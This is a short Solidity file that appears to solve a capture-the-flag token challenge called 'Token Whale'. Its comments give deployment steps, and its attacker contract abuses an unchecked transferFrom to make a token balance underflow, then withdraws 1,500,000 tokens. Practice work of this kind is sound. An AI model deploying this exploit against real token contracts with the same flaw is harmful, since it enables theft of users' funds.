// Challenge contract deployed at address: 0xc2c6F1a49244C2591752e14aaa5325B286daE0cf
// 1 - Deploy TokenWhaleChallengeAttacker - 0xD8CD9D78Ac7d297E14b7c920c656C04637f4CBA7
// 2 - Approve 0xD8CD9D78Ac7d297E14b7c920c656C04637f4CBA7 for 3000000 tokens
// 3 - Call attack function of TokenWhaleChallengeAttacker

pragma solidity ^0.4.21;

interface ITokenWhaleChallenge {
    function transfer(address to, uint256 value) external;

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external;
}

contract TokenWhaleChallengeAttacker {
    ITokenWhaleChallenge public challenge;

    function TokenWhaleChallengeAttacker(address challengeAddress)
        public
        payable
    {
        challenge = ITokenWhaleChallenge(challengeAddress);
    }

    function attack() external payable {
        challenge.transferFrom(msg.sender, address(0), 1);
        challenge.transfer(msg.sender, 1500000);
    }
}
